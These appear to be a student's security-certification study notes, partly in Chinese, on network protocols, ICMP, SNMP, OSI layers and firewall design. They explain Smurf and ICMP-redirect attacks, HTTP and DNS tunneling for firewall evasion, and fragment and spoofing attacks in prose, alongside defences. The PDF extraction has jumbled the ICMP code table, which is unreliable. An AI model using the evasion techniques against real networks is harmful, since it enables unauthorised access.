the STARTTLS command allows the protocol to use the same port for both.
  - An encrypted version of the protocol to use the same port. Common protocols for email and the web include:
SMTP - Simple Mail Transfer Protocol TCP port 25
  - transfers email between clients and SMTP servers.
  - unofficially used port 465 with SSL and port 587 with TLS.
  - STARTTLS is now recommended to initialize a secure connection.
POP3-PostOfficeProtocolv3: TCPport110 SPOP - Secure POP TCP port 995
  - transfers emails from servers down to clients.
  - Secure POP3: encrypts the transmission with SSL/TLS
  - STARTTLS is now recommended to create a secure connection ▪


##   - Secure POP uses TLS on port 995 (legacy) or with STARTTLS on port 110.
IMAP4 - Internet Message Access Protocol version 4 TCP port 143 Secure IMAP: TCP port 993
  - to store email on an email server.
  - allows a user to organize and manage email in folders on the server.
  - Example: Google Mail
  - STARTTLS is recommended using the same TCP port 143.
HTTP - Hypertext Transfer Protocol TCP port 80
  - transmits web traffic on the Internet and in intranets.
  - Web servers use HTTP to transmit web pages to clients’ web browsers.
  - Hypertext Markup Language (HTML): common language used to display the web pages.
HTTPS - Hypertext Transfer Protocol Secure: port 443
  - encrypts web traffic to ensure it is secure while in transit.
  - Web browsers indicate secure session is using HTTPS:
  - by displaying a lock icon
  - By HTTPS in the Uniform Resource Locator (URL) field.
HTTP - Hypertext Transfer Protocol
TCP service, port 80.
HTTP use a request response protocol.
  - client sends a request and a server send a response.
- originally designed to transfer hypertext “structured text that uses
logical links, a.k.a. hyperlinks, between nodes containing text”
- was designed as a request-response Application layer protocol
   where a client could request hypertext from a server.
  - This hypertext could be modified and set up in such a way as to provide all sorts of goodies to the requesting user agent (UA)—for example, a web browser.
  - example
  - a client requests a particular resource using its Uniform Resource Identifier (URI)—most commonly expressed for web requests in the form of a URL (Uniform Resource Locator)
  - a server responds to the HTTP request by providing the resource requested.
- HTTP can be used for virtually anything anymore, good or bad intent.
  - It also provides for (mostly) secure communication in its HTTPS version: HTTP over TLS, or SSL.
  - Although I could go on and on about other features of HTTP, including some well-know recent attacks against the secure version (HEARTBLEED and POODLE)
  - the particular markup of hypertext most see: HTML.
Typical transaction:
- the client will send an HTTP request and indicate what the client wants. any requests of data.
- several status codes within HTTP.
 ⁃
  - 200 or success: everthing's okay and the data will follow.
- Most application layer protocols have a typical format,
  - the frame header, the network layer header, and the transport
layer header, followed by the data.  ⁃
  - the frame header, the network layer, and the transport layer header remain pretty much the same.
  - The data and the application layer header changes according to what's happening in the conversation, and whether it's from the client or from the server.
- So with HTTP, could possibly get the HTTP header information that includes the general header, request and response head, or the
entity header, and then within that, you have the HTTP body, which holds the HTML code or the webpage, so that it can rebuild that in your browser. ▪


##  NOTE
HTML was designed specifically to display data XML was created to transport and store data.
- XML tags are, basically, whatever you want them to be.
Simple Mail Transfer Protocol (SMTP)
a TCP service on port 25
design for the exchange of electronic mail between network systems.
   ▪


##  spoofing and spamming are 2 vulnerabilities associated with SMTP.
Way to send email:
1. Mail client software
2. https
Sender PC - Mail queue - SMTP Server - Inetrnet (DNS decided msn/gmail/yahoo.com) - Mail queue - POP3 Server - recieved email.
Directory Services Use Case
use a directory service to streamline management and implement security. provide secure access to the network.
Example:
Microsoft Active Directory Domain Services (AD DS)
  - provides the means for administrators to create user objects for each authorized user and computer objects for each authorized computer. Administrators then use various methods within the directory service to enforce identification, authentication, and authorization methods.
Kerberos
UDP port 88.
  - the authentication protocol
  - usedinWindows domains and some Unix environments.
  - uses a Key Distribution Center (KDC): to issue timestamped tickets. LDAP - Lightweight Directory Access Protocol: TCP port 389
  - to communicate with directories: l i k e AD DS.
  - provides a clear syntax for object identification and
management.
  - LDAP uses.
  - LDAPS - LDAP Secure: TCP port 636
  - encrypts data with TLS Group Policy:
  - Administrators use Group Policy Objects (GPOs) to configure settings.
  - They can then apply these GPOs to users and computers within the domain.
Remote Access Use Cases
Administrators often implement SSH to support remote access.
Example: many Linux administrators use Netcat when connecting to remote
systems for administration, and secure the Netcat transmissions with SSH.
Administrators connect to servers remotely using:
VPN SSH
  - because SSH encrypts the connection. Remote Desktop Protocol (RDP)
  - connect to other systems from remote locations.
  - Microsoft use RDP: Remote Desktop Services, Remote Assistance...
  - RDP uses TCP or UDP 3389, TCP more common.
  - A common reason users are unable to connect to systems with RDP
  - port 3389 is blocked on a host-based or network firewall. Secure Shell (SSH)
  - Administrators commonly connect to remote systems using SSH instead of Telnet ▪


##  provides a secure method of connecting to devices, but does not monitor them.
sends no data in cleartext. All encrypted. SSHv2 offers greater protection.
Time Synchronization Use Case
systems need to be using the same time (or time that is reasonably close). ensure
systems have the accurate time.
Example:
Kerberos requires all systems to be synchronized and be within five minutes of
each other.
- Network Time Protocol (NTP). UDP port 123
  - most commonly used protocol for time synchronization, allowing
systems to synchronize their time to within tens of milliseconds.
  - Example:
  - Within a Microsoft domain:
  - one domain controller periodically uses the Windows Time service to
locate a reliable Internet server.
  - Other domain controllers within the network periodically synchronize
their time with the first domain controller.
  - Last, all computers in the domain synchronize their time with one of
these domain controllers.
  - This process ensures all the computers have the accurate time.
- Simple NTP protocol: (SNTP) UDP port 123
  - used for time synchronization.
  - But NTP uses complex algorithms and queries multiple time servers
to identify the most accurate time.
  - SNTP does not use these algorithms, might not be as accurate as NTP.
NTP allows you to set the clocks on your systems very
 accurately, to within 100ms and sometimes-even 10ms. Knowing the exact time is extremely important to prevent
"playback" attacks.
- Various security protocols depend on an accurate source of time information, tag their communications with the current time
- prevent attackers from replaying the same communications, e.g., a login/password interaction or even an entire communication, at a later date.
Network Address Allocation Use Case
allocating IP addresses to hosts within your network.
Dynamic Host Configuration Protocol (DHCP) UDP 67,68
  - most networks use it
  - dynamically assign IP addresses to hosts.
  - also assigns other TCP/IP information (like subnet masks, default
gateways, DNS server addresses...)
Domain Name Resolution Use Case
Domain Name System (DNS):
The primary purpose: domain name resolution. DNS resolves host names to IP addresses.
 Most DNS servers on the Internet run Berkeley Internet Name Domain (BIND) software and run on Unix or Linux servers.
Internal networks can use BIND, but in Microsoft networks, DNS servers commonly use the Microsoft DNS software.
Zone data is updated with zone transfers
  - secure zone transfers:prevent unauthorized access to zone data
Occasionally, DNS servers share inofrmation with each other (zone transfer):
  - Most case, zone transfer only includes a small number of updated records.
  - But some transfers include all the records in the zone.
  - DNS severs:
  - TCP 53 for zone transfer.
  - UDP 53 for name resolution queries.
Test DNS:
  - Both support the axfr switch, allowing them to download all zone data
from a DNS server, unless the DNS server blocks the attempt.
  - Microsoft: Nslookup (name server lookup)
  - use nslookup to verify that a DNS server can resolve specific host names or fully qualified domain names (FQDNs) to IP addresses.
  - fully qualified domain name includes: the host name and domain name.
  - Linus: dig (domain information groper)
  - use dig to query DNS servers to verify that the DNS server is
reachable and to verify that a DNS server can resolve names to
IP addresses.
  - Dig verifies DNS functionality by querying DNS: verifying a
record exists, verifying that the DNS server responds.
  - Some versions of both commands support the @ symbol to identify a
specific DNS server you want to query.
  - This is useful if you want to pull all the records from a DNS zone.
  - When doing this, you would use the any switch (indicating all records) or the axfr switch (short for all transfer).
  - However, most DNS servers are configured to block these queries. Domain Name System Security Extensions (DNSSEC)
provides validation for DNS responses, prevent DNS poisoning attacks. ▪


## Subscription Services Use Case
Subscription services: subscription-based business model.
Vendors have moved to a subscription model where users pay over time. Example:
purchase Microsoft Office / pay monthly or annually for access to Office 365.
The protocols used for subscription services depending on the actual service.
Common use HTTPS connections for security.
  - connections between web servers and database servers should be secure by
using HTTPS or TLS.
When the subscription is nearing an end, systems send automated emails to customers
using SMTP.
Voice and video calls are established with session initiation protocol (SIP).
realtime transfer protocol (RTP): Voice and video calls are transmitted with RTP.
sRTP (secure realtime transfer protocol): secure voice calls or video, particularly for confidential video conferences.
Internet Control Message Protocol (ICMP)
network-layer, layer 3.
used by hosts
ICMP is an integral part of the internet protocol
  - must be implemented by every IP module as it's part of the original RFC.
   ▪


##   - is used by routers, devices, hosts, to communicate updates or error information.
  - essentially a scout for the internet protocol, making sure the route is clear and communicating any errors.
  - the internet protocol would be nothing without ICMP.
  - no data exchanged, simply error reporting.
  - also used by the utility ping for echo request, echo reply
messages.
IP is unreliable and doesn't guarantee delivery
it's important to notify the sender when something goes wrong. ICMP is used to give feedback about network problems that are preventing packet delivery.
for testing basic connectivity, debugging and report logical error.
  - primarily used for network diagnostic tasks
  - includes tools: ping, pathping, tracert.
  - determining if a host is alive
  - finding the path followed by a packet
to different ICMP: ICMPv4 for IPv4, ICMPv6 for IPv6.
TCP/IP environments must support ICMP: an essential service for network management.
ICMPv6
IPv6 does not have any ARP or IGMP. So ICMPv6 assumes those 2 roles.
- MLD Protocol: nulticast listener discovery messages.
   ▪


##     Simple messages encapsulated in single IP packets
ICMP is a powerful protocol, but also can be used in malicious ways. For exampl, ▪


## - ICMP is used in reconnaissance by Kali Linux. to do reconnaissance to do a ping sweep or to evade firewall rules.
- Many DoS attacks use ICMP.
- Blocking ICMP:
  - Because of how often ICMP is used in attacks, it is common
to block ICMP at firewalls and routers, which disables a ping
response.
  - prevents attackers from discovering devices in a network.
  - Example, send a ping to every IP address in a subnet. The
devices that reply verify that they are on and have an IP address.
what type of ICMP packets are you going to allow?
- The only really essential ICMP traffic is type 3, that's your
destination unreachable, and then the codes that fall within that.
- The others are optional, the type 0, 8, and 11. optional,.
ICMP packets follow a basic format:
frist byte of header indicates the type of message.
the net byte contains the code for each particular type of ICMP;
an ICMP error message
- have the IP header, the first eight bytes of the original datagram
that caused the error.
- The type, the code, checksum, and then the internet header and the
first 64 bits of the original datagram.
    Type 0 — Echo Reply
        Codes
            0  No Code
Type 1 — Unassigned
Type 2 — Unassigned
Type 3 — Destination Unreachable
 Codes
0 Net Unreachable
1 Unreachable
2     Unreachable
3 the port closed.
            4  Fragmentation Needed and Don't
Fragment was Set
Network is
Host is
 5  Source Route Failed
 6  Destination Network Unknown
 7  Destination Host Unknown
 8  Source Host Isolated
 9  Communication with Destination
    Administratively Prohibited
10  Communication with Destination
    Administratively Prohibited
11  Destination Network Unreachable
Protocol
  for Type of Service
           12  Destination Host Unreachable for
Type of Service
           13  Communication Administratively
stopped/filtered by firewall/router.
        14  Host Precedence Violation
        15  Precedence cutoff in effect
Type 4 — Source Quench (Deprecated): a congestion control message. Type 5 — Redirect: sent when there are more gateways available for the sender to use and the best route available to the destination is not the
configures default gateway.
Codes
 Prohibited
(or subnet)
0  Redirect Datagram for the Network
1  Redirect Datagram for the Host
Host
Port
Unreachable
            2  Redirect Datagram for the Type of
Service and Network
            3  Redirect Datagram for the Type of
Service and Host Type 6 — Alternate Host Address (Deprecated)
Type 7 — Unassigned
Type 8 — Echo
Type 9 — Router Advertisement
Type 10 — Router Selection
Type 11 — Time Exceeded: the packet took too long te be routed to the
destination.
Codes
 TTL expired
0  Time to Live exceeded in Transit:
1  Fragment Reassembly Time Exceeded
Type 12 — Parameter Problem
          Codes
            0  Pointer indicates the error
            1  Missing a Required Option
            2  Bad Length
Type 13 — Timestamp
1. The requestor stamps the originate time and sends the query.
2. The replying system stamps the receive time when it receives the query.
3. The replying system stamps the transmit time when it sends the reply to the query.
Type 14 — Timestamp Reply
Type 15 — Information Request (Deprecated) Type 16 — Information Reply (Deprecated)
Type 19 — Reserved (for Security)
Types 20-29 — Reserved (for Robustness Experiment) Type 30 — Traceroute (Deprecated)
  Type 17 — Address Mask Request (Deprecated) Type 18 — Address Mask Reply (Deprecated) Type 31 — Datagram Conversion Error (Deprecated) Type 32 — Mobile Host Redirect (Deprecated)
Type 33 — IPv6 Where-Are-You (Deprecated)
Type 34 — IPv6 I-Am-Here (Deprecated)
Type 35 — Mobile Registration Request (Deprecated) Type 36 — Mobile Registration Reply (Deprecated) Type 37 — Domain Name Request (Deprecated) Type 38 — Domain Name Reply (Deprecated)
Type 39 — SKIP (Deprecated)
Type 40 — Photuris
         Codes
            0 = Bad SPI
         1 = Authentication Failed
            2 = Decompression Failed
            3 = Decryption Failed
            4 = Need Authentication
            5 = Need Authorization
Type 41 — ICMP messages utilized by experimental mobility protocols such as Seamoby
Type 42 — Extended Echo Request
Type 43 — Extended Echo Reply
Types 44-252 — Unassigned
Type 253 — RFC3692-style Experiment 1
Type 254 — RFC3692-style Experiment 2
ICMP Extension Object Classes and Class Sub-types
Sub-types — Class 1 — MPLS Label Stack Class
Sub-types — Class 2 — Interface Information Object
Sub-types — Class 2 — Interface Information Object — Interface Roles Sub-types — Class 3 — Interface Identification Object
Several network management tools use the above ICMP messages:
- Ping:   - Uses ICMP protocol to verify if a particular host is receiving packets.
  - Ping sends an ICMP echo request message to the destination host,
  - the destination host replies an ICMP echo response message.
  - This protocol is often the first diagnosis tool used to test if
hosts are working properly.
  - provides statistics on roundtrip times and packet loss
- Traceroute: sends series ICMP packets with increasing TTL value to discover routes Send packet with TTL 1,2,3,4.... To
get know the neighbor router.
  - uses ICMP to determine the path a packet takes to reach another host, either on a local network or on the Internet.
  - Accomplishe with use of time-to-live (TTL) field in the IP header.
  - the sender use traceroute send a packet to the target with a TTL of 1.
  - an intermediate router received the packet with a TTL of 1, discards丢弃 the packet and replies to the sender with an
ICMP time exceeded message, revealing the first machine
along the path to the target.
  - Next, traceroute sends a packet with a TTL of 2.
  - reach the first router in the path, the TTL decremented by one
and forwarded to the next router, the next router sends an
ICMP packet to the original sender.
  - By incrementing the TTL field in this way, traceroute can
determine each host along the path to the target.  ICMP是控制协议。
明确一点: 本身就是ICMP差错报文的情况下，不会产生ICMP差
错报文。但是，ICMP 查询报文可能会产生 ICMP 差错报文。
SMURF攻击: 一种分布式拒绝服务攻击。
A:攻击者
B:受害者
C:具有大量主机和网络连接的网络 A冒充B向C网络发送ICMP的ECHO REQUEST的广播包。C网络 的路由器接收到后，将 ICMP 的 echo 广播包发送给网络中所有的 主机。C 网络中的所有主机会向 B 回复 ICMP 的 ECHO REPLY 包 (若这是一个很大的网络，会有 500 个以上的主机回复这个请 求。)。最终 B 的系统会被大量的 ECHO REPLY 信息吞没，阻止 系统回复其他的请求，形成 DOS 攻击。
防治手段:配置各个主机和路由器不响应 ICMP 请求或广播;或 者配置路由器不转发定向到广播地址的数据包。
 protecting a router from potential smurf attacks
 router from
ICMP重定向攻击 A:攻击者 B:受害者 C:受访问的网络
accepting broadcast ping messages
首先，当 B 要访问 C 网络的时候，会向当前网关发送访问请求。A 通过网络嗅探等工具捕获这一请求的时候，A 冒充 B 的网关向 B 发 送 ICMP 重定向报文，将网关地址重定向为 A 的地址(或者其他地 址)。
当 B 收到 A 发送的重定向报文的时候，就会修改 B 的路由表，将 访问 C 网络的网关地址改为重定向的地址。最终导致 B 访问 C 网 络的过程中会有一个中间人(重定向后的网关地址)。
防御手段:主机过滤掉 ICMP 重定向报文。
2,593 - ▪


## SYSLOG
a widely used standard for message logging.
It permits separation of the software that generates
messages, the system that stores them, and the software that reports and analyzes them.
protocol specifically designed for transporting event messages.
SNMP Simple network management protocol version3 a UDP service
on port 161 and 162
  - SNMPv3 uses UDP port 161
  - sends traps (error messages and notifications) on UDP port 162.
     - ▪


##  a secure protocol
  - Manage network devices, not transfer files.
  - monitor and collect information from network devices.
  - or have network devices report status back to a central network
management system.
It includes strong authentication mechanisms to protect the confidentiality of credentials.
SNMPv3 agents installed on devices send information to an SNMP manager via notifications known as traps (sometimes called device traps).
The first version of SNMP had vulnerabilities, such as passing passwords across the network in cleartext.
  - SNMPv2 and SNMPv3: more secure, provide strong authentication mechanisms.
  - SNMPv3 uses UDP port 161. It sends traps (error messages and notifications) on UDP port 162.
  - SNMPv3 offers encryption. use cases implement with routers:
Prevent IPaddress spoofing. Antispoofing methods,implemented with rules in ACLs.
Provide secure management of routers: SNMPv3 is used to securely manage network devices such as routers.
problem plague SNMP:
because community strings (which act as a pseudo password) can be passed as cleartext and the default community strings (public/private) are well known.
       Layer 5: The Session Layer
- responsible for setting up, maintaining, and tearing down sessions.
  - A session: a conversation that needs to be treated separately from other sessions to avoid intermingling of data from different conversations.
- Not every network application neatly maps directly into layers of the OSI model. The session layer might not be possible to identify what protocol in a given scenario is operating at this layer.
- session layer protocol example:
  - Network Basic Input/Output System (NetBIOS)
  - an application programming interface (API)
  - developed in the early 1980s
  - allow computer-to-computer communication on a small
LAN
  - specifically, PC-Network, which was IBM’s LAN technology at the time
  - Later, IBM needed to support computer-to-computer communication over larger Token Ring networks.
  - As a result, IBM enhanced the scalability and features of NetBIOS with a NetBIOS emulator named NetBIOS Extended User Interface (NetBEUI).
  - H.323:
  - help set up, maintain, and tear down a voice or video
connection.
Setting up a session:
- Setting up a session:
  - Checking user credentials (like username and password)
  - Assigning numbers to a session’s communications flows to
uniquely identify each flow
  - Negotiating services required during the session
  - Negotiating which device begins sending data
- Maintaining a session:
  - Transferring data
  - Reestablishing a disconnected session
  - Acknowledging receipt of data - Tearing down a session:
  - A session can be disconnected based on mutual agreement of
the devices in the session.
  - a session might be torn down because one party disconnects
(intentionally or error condition).
  - When one party disconnects, the other party can detect a loss
of communication with that party and tear down its side of the session.
The session layer: Remote procedure call(RPC), Secure Shell (SSH) and Network File System(NFS)
Layer 6: The Presentation Layer
- responsible for the formatting of data being exchanged and securing that data with encryption.
- Data is put into a format that programs in application layer can understand.
- gateway service:
  - allow for sending and receiving data between different networks that use different protocols that would otherwise make them incompatible.
- Data formatting:
  - Some applications format text using American Standard Code for Information Interchange (ASCII), Extended Binary Coded Decimal Interchange Code (EBCDIC)...
  - The presentation layer is responsible for formatting the text (like multimedia or graphics) in a format that allows compatibility between the communicating devices.
- data compression:
  - so the actual number of bits that transmitted on the network can be reduced.
- Encryption:
  - To add a layer of security for sending sensitive information over a network, encryption can be used to scramble up (encrypt) the data in such a way.   - If the data were intercepted, a third party would not be able to unscramble it (decrypt). However, the intended recipient would be able to decrypt the transmission.

---



## Layer 7: The Application Layer


- The physical, link, network, and transportation layers:
  - provides a basic underlying network infrastructure, allows applications to communicate with each other.
- the application layer:
  - Most of the action of the Internet takes place.
  - provides application services access to a network. supports services used by end-user applications.
  - end-user application do not reside at the application layer. (example, Microsoft Word)
  - e-mail: an application layer service, does reside at the application layer,
  - Microsoft Outlook (e-mail client): application, not live at the application layer.
  - Another function: advertising available services.
- Application services:
  - Examples of the application services residing at the application layer
include file sharing and e-mail. - Service advertisement:
  - Some applications’ services (like some networked printers) periodically send out advertisements, making the availability of their service known to other devices on the network.
  - Other services, however, register themselves and their services with a centralized directory (like Microsoft Active Directory), which can be queried by other network devices seeking such services. - at the top of the OSI stack, its functions are closest to the end user.
1.1 A Sample of Application-Layer Protocols
application-layer protocols designed to perform important tasks at Internet- scale:
Domain name system(DNS).
  - The protocol that allows us to use domain names rather than using
IP addresses.
  - Most application programs and other application-layer services rely on DNS.
Hypertext transfer protocol (HTTP).
  - This is the protocol used to browse the Web.
  - HTTPS: encryption.
SSL/TLS. This is the protocol used for secure, encrypted browsing (i.e., with
HTTPS). IMAP/POP/SMTP .
  - These are protocols that make Internet email possible.
  - Encrpt the login credentials for email client.
File transfer protocol(FTP).This is an old, but still used, protocol that provides a simple interface for uploading and downloading files. It does not encrypt data during transfer.
SOAP. This is a more recent protocol for exchanging structured data as a part of the web services paradigm.
Telnet.
  - This is an early remote access protocol.
  - Like FTP, it doesn’t encrypt connections. SSH.
  - This is a more secure remote access and administration protocol.
Each application-layer protocol comes with its own security considerations, and an entire book could be written on the vast number of application-layer protocols. In this section, we focus on one of the most commonly used protocols, DNS, since it is one of the pillars of the architec- ture of the Internet itself.

---

## DNS (recorded)
---

## Firewalls
It is now an accepted fact that the Internet is a vast network of untrusted and potentially malicious machines. to protect private networks and individual machines from the dangers of the greater Internet, a firewall can be employed to filter incoming or outgoing traffic based on a predefined set of rules that are are called firewall policies.
Firewalls may be used both as a protective measure, to shield internal network users from malicious attackers on the Internet, or as a means of censorship. Firewalls can be implemented in either hardware or software
typically deployed at the perimeter of an internal network where connects to the Internet.
the Internet is considered an untrusted zone,
the internal network is considered a zone of higher trust,
any machines situated between the Internet and the internal trusted network are in demilitarized zone (DMZ).
A firewall isn’t the end-all of security; it’s just one tool in the arsenal, not the whole thing.
- an appliance within a network that is designed to protect internal resources from unauthorized external access.
- Firewalls work with a set of rules, explicitly stating what is allowed to pass from one side of the firewall to the other.
- most firewalls work with an implicit deny principle, if there is not a rule defined to allow the packet to pass, it is blocked—there is no need to create a rule to deny packets.
  - Example
  - A rule saying port 80 is allowed to pass from external to
internal, but if there is not a rule saying port 443 is allowed, SSL requests to internal resources will automatically be denied.
most firewalls, the list of rules is usually read in order, from top to
Firewalls
   ▪


## bottom.
- As soon as a match is made, the decision on whether to pass the
packet is made.
- Example
- an access control list (ACL) that starts out with an entry of “allow ip any any” makes the firewall moot
  - every IP packet will be allowed to pass because the match is made on the first entry.
- Most firewalls are configured with rule sets to allow common traffic
  - such as port 80 if you’re hosting web servers and port 53 for DNS lookups
  - and then rely on implicit deny to protect the rest of the network.
Many firewalls (just like routers) implement network address translation (NAT) at the border, and NAT can be implemented in many different ways.
Basic NAT, a one-to-one mapping
A more common method: NAT overload (port address translation
PAT)
Much like IDSs, the placement of firewalls is important. In general, a firewall is placed on the edge of a network, with one port facing outward, at least one port facing inward, and another port facing toward a DMZ (an area of the network set aside for servers and other resources that the outside world would need access to). Some networks will apply additional firewalls throughout the enterprise to segment for all sorts of reasons.
- The screened subnet (a.k.a. public zone) of your DMZ is connected to the Internet and hosts all the public-facing servers and services your organization provides.
- These bastion hosts sit outside your internal firewall and are designed to protect internal network resources from attack: they’re
 called bastions because they can withstand Internet traffic attacks.
- The private zone holds all the internal hosts that, other than
responding to a request from inside that zone, no Internet host has
any business dealing with.
- because your firewall has two or more interfaces, it is referred to as
multi-homed.
Originally, firewalls were all packet-filtering firewalls.
- basically looked at the headers of packets coming through a port
and decided whether to allow them based on the ACLs configured.
- does provide the ability to block specific protocols
- the major drawback with packet filtering
  - incapable of examining the packet’s payload
  - has no means to identify the state of the packet. This gave rise to stateful inspection firewalls
- track the entire status of a connection.
- For instance
- if a packet arrives with the ACK flag set but the firewall has no
record of the original SYN packet, that would indicate a malicious
attempt.
- ECC also calls these “stateful multilayer inspection” firewalls,
with the capability from the Network layer up to the Application layer (although their focus is in Layers 3 and 4).
circuit-level gateway firewall
- works at the Session layer of the OSI model.
- allows or prevents data streams, not necessarily concerned with
each packet.
application-level firewall
- filters traffic much like a proxy
- allowing specific applications (services) in and out of the network
based on its rule set.
EXAM TIP ▪


## HTTP tunneling is a firewall evasion technique
- lots of things can be wrapped within an HTTP shell (Microsoft
Office has been doing this for years).
- And, because port 80 is almost never filtered by a firewall, you can
craft port 80 segments to carry payload for protocols the firewall
may have otherwise blocked.
- HTTP beacons and HTTP tunnels are the de facto standard implant
technology for hackers.
create a network link between two computers in conditions of restricted network connectivity including firewalls, NATs and ACLs, among other restrictions.
  - The tunnel is created by an intermediary called a proxy server which is usually located in a DMZ.
Firewall Policies
Packets flowing through a firewall can have one of 3 outcomes: Accepted: permitted through the firewall
Dropped: not allowed through with no indication of failure
Rejected: not allowed through, accompanied by an attempt to inform the
source that the packet was rejected.
Policies used by the firewall to handle packets are based on several properties of the packets being inspected, including the protocol used (such as TCP or UDP), the source and destination IP addresses, the source and destination ports, and, in some cases, the application-level payload of the packet (e.g., whether it contains a virus).
         firewall
- filters incoming and outgoing traffic for a single host or between networks.
- ensure only specific types of traffic are allowed into / out of a network / host.
  - Example: firewalls can block potentially malicious downloads.
- Firewalls start with a basic routing capability for packet filtering, including
the use of an implicit deny rule.
- More advanced firewalls go beyond simple packet filtering and include
advanced content filtering.
Blacklists and White Lists
There are two fundamental approaches to creating firewall policies (or rule- sets) to effectively minimize vulnerability to the outside world while main- taining the desired functionality for the machines in the trusted internal network (or individual computer). Some network administrators choose a blacklist approach, or default-allow ruleset. In this configuration, all pack- ets are allowed through except those that fit the rules defined specifically in a blacklist. This type of configuration is more flexible in ensuring that service to the internal network is not disrupted by the firewall, but is naive from a security perspective in that it assumes the network administrator can enumerate all of the properties of malicious traffic.
A safer approach to defining a firewall ruleset is to implement a white list or default-deny policy, in which packets are dropped or rejected unless they are specifically allowed by the firewall. example, a network administrator might decide that the only legitimate traffic entering the network is HTTP traffic destined for the web server and that all other in- bound traffic should be dropped. While this configuration requires greater familiarity with the protocols used by the internal network, it provides the greatest possible caution in deciding which traffic is acceptable. ▪


## client-server tool utilized to evade firewall inspection: tcp-over- dns
Firewalls: support policies that are based on properties of each packet in isolation, or they can consider packets in a broader context.
Stateless Firewalls, Packet Filtering Firewalls
doesn’t maintain any remembered context (state) with respect to the packets it is processing.
don’t have any memory dedicated to determining if a given packet is part of an existing connection or has processed previously
treats each packet attempting to travel through it in isolation, simply inspect packets and apply rules based on the source and destination
IP addresses and ports.
The simplest and earliest kinds of firewalls
In packet filtering, a screening router examines the header of every
packet of data traveling between the Internet and the corporate network.
  - Information in packet headers: IP address of the sender and receiver and the authorized port numbers (application or service) allowed to use the information transmitted.
Based on that information, the router knows what kind of Internet
service, such as web-based or FTP, is being used to send the data as well as the identities of the sender and receiver of the data.
Using that information, the router can prevent certain packets from
       ▪


## being sent between the Internet and the corporate networ
  - example, the router could block any traffic except for emaik. l or traffic to and from suspicious destinations.
use an implicit deny strategy:
  - block all traffic that is not explicitly allowed.
  - Provide a secure starting point for a firewall.
  - when deny-all principle is the practice, if a port is not being used, it will already be closed.
rules generally take the following format:
  - Permission: PERMIT / ALLOW allowing the traffic, DENY to block the traffic.
  - Protocol: blocking specific TCP or UDP ports.
  - to block both TCP and UDP traffic using the same port,
use IP instead.
  - Using ICMP here blocks ICMP traffic, effectively blocking ping and some other diagnostics that use ICMP.
  - Source: source IP address. allow or block traffic from a single IP, or a range of IP, subnet. Wildcards such as any or all include all IP addresses.
  - Destination: destination IP address. Wildcards such as any or all include all IP addresses.
  - Port or protocol. Typically, you’ll see the well-known port such as port 80 for HTTP. However, some devices support codes such as www for HTTP traffic. Some systems support the use of keywords such as eq for equal, lt for less than, and gt for greater than. example, instead of just using port 80, it might
 ▪


## indicate eq 80.
Some firewalls require you to include a subnet mask in the rule.
  - Example:
  - block all SMTP traffic to the 192.168.1.0/24 network, you would use an IP address of 192.168.1.0 and a subnet mask of 255.255.255.0.
  - allow SMTP traffic to a single IP address of 192.168.1.20/24, you would use an IP address of 192.168.1.20 and a subnet mask of255.255.255.255.
Advantages
Simplicity
generally stable performance as the filtering rules are performed at
the network layer.
Because the direct exchange of packets is permitted between outside
systems and inside systems, the potential for an attack is determined by the total number of hosts and services to which the packet filtering router permits traffic. Also, if a single packet filtering router is compromised, every system on the private network may be compromised and organizations with many routers may face difficulties in designing, coding and maintaining the rule base.
This means that each host directly accessible from the Internet needs to support sophisticated user authentication and needs to be regularly
examined by the network administrator for signs of attack.
disadvantage
Its simplicity is also a disadvantage, because it is vulnerable to
attacks from improperly configured filters and attacks tunneled over permitted services
     ▪


##  lack flexibility
often require a choice between limited functionality and lax security.
Case: a internal network user wish to connect via TCP to an external web site.
Allow Packets
First, the user initiates the connection by sending a TCP packet marked with the SYN flag set.
  - In order for this packet to be allowed, the firewall must permit outbound packets originating at the user’s IP from whichever port the user sends the request.
Next, the web server responds with a packet that has the SYN and ACK flags set.
  - For this packet to be allowed through, the firewall must allow inbound packets sent from the web server, presumably originating from the appropriate port for web traffic.
   ▪


##   Blocking Undesired Packets
Note that if the above policy were in place, all traffic from a web
server originating at the default port for web servers would be allowed through the firewall to the user’s machine, which may be undesirable.
This policy can be tightened
the firewall does not need to allow TCP packets marked with just
the SYN flag to reach the user.
While this restriction would prevent outside parties from initiating
TCP connections to an internal machine, it would not prevent them from probing the network with other packets not marked with the SYN flag.
   ▪


##   Some common attacks against packet filter firewalls:
IP spoofing—fakes the IP address of either an internal network host or a trusted network host so that the packet being sent will pass the rule base of the firewall.
  - This allows for penetration of the system perimeter.
  - If the spoofing uses an internal IP address, the firewall can be configured to drop the packet on the basis of packet flow direction analysis.
  - However, if the attacker has access to a secure or trusted external IP address and spoofs on that address, the firewall architecture is defenseless.
Source routing specification—It is possible to define the routing that an IP packet must take when it traverses from the source
host to the destination host, across the Internet. In this process, it is possible to define the route, so it bypasses the firewall.
 ▪


##   - Only those that know of the IP address, subnet mask and default gateway settings at the firewall routing station can do this.
  - Defense: examine each packet and, if the source routing specification is enabled, drop that packet.
  - However, if the topology permits a route, skipping the choke point, this countermeasure will not be effective.
Miniature fragment attack—fragments the IP packet into smaller ones and pushes it through the firewall in the hope that only the first of the sequence of fragmented packets would be examined and the others would pass without review.
  - This is true if the default setting is to pass residual packets.
  - Defense: configure the firewall to drop all packets where IP fragmentation is enabled.
 Stateful Firewalls
- inspects traffic and makes decisions based on the context, or state, of the traffic.
- keeps track of established sessions and inspectstrafficbasedonits state within a session. ▪


##   - allows traffic to originate from an inside network (a trusted network) and go out to the Internet (an untrusted network).
  - return traffic to the inside network: allowed.
  - not returning traffic (originated from a device on the
Internet): blocks it.
- Example, a TCP session starts with a three-way handshake. If a
stateful firewall detects TCP traffic without a corresponding three- way handshake, it recognizes this as suspicious traffic and can block it.
iptables是状态防火墙。状态防火墙优点: 建立连接状态表，可以实 现比较好的过滤效果。
- sudo iptables –P INPUT DROP; iptables -A INPUT -p tcp --sport 80 -j ACCEPT
- 第一句，将iptables的策略制定为丢弃所有传入的数据包。
- 第二句，添加INPUT策略，允许tcp源端口号为80的数据包通
过防火墙。
- 合在一起: 只允许源端口为80的数据包通过。
A common security issue with stateless firewalls: misconfigured ACLs.
- Example:
- if the ACL doesn’t include an implicit deny rule, it can allow
almost all traffic into the network.
Stateful firewalls: can tell when packets are part of legitimate sessions originating within a trusted network. Context-sensitive.
Like NAT devices, stateful firewalls maintain tables containing information on each active connection, including the IP addresses,
ports, and sequence numbers of packets.
Using these tables, stateful firewalls can solve the problem of only
allowing inbound TCP packets that are in response to a connection 2,647

▪
initiated from within the internal network.
